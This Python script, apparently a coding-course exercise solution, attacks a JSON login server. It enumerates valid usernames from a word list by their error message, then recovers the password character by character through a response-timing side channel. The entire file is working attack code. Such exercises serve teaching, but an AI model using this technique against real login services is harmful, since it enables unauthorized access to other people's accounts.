# write your code here
import json
import string
import sys
import socket
import time


found_pw_dic = {}
client_socket = socket.socket()

def init():
    args = sys.argv
    ip_address = args[1]
    port = args[2]
    client_socket.connect((ip_address, int(port)))

def json_login_string(username, password=' '):
    dictionary = dict()
    dictionary['login'] = username
    dictionary['password'] = password
    return json.dumps(dictionary)

def get_username_list():
    user_list = []
    with open("logins.txt", "r") as file:
        for line in file:
            user_list.append(line.strip("\n"))
    return user_list

def client_response(response):
    result_dic = json.loads(response)
    return result_dic["result"]

def get_correct_user():
    user_list = get_username_list()
    for username in user_list:
        login_request = json_login_string(username)
        client_socket.send(login_request.encode())
        response = client_socket.recv(1024)
        if client_response(response.decode()) == "Wrong password!":
            return username


def find_password(user_name, found=""):
    letters = string.ascii_letters + string.digits
    for letter in letters:
        temp_password = found + letter
        login_request = json_login_string(user_name, temp_password)
        start = time.time()
        client_socket.send(login_request.encode())
        response = client_socket.recv(1024)
        end = time.time()
        if (end - start) >= 0.1 and client_response(response.decode()) == "Wrong password!":
            found = found + letter
            find_password(user_name, found)
            break
        elif client_response(response.decode()) == "Connection success!":
            client_socket.close()
            global found_pw_dic
            found_pw_dic = {"login": user_name, "password": temp_password}
            return found_pw_dic

def run():
    user_name = get_correct_user()
    find_password(user_name)
    json_out = json.dumps(found_pw_dic)
    print(str(json_out))


init()
run()

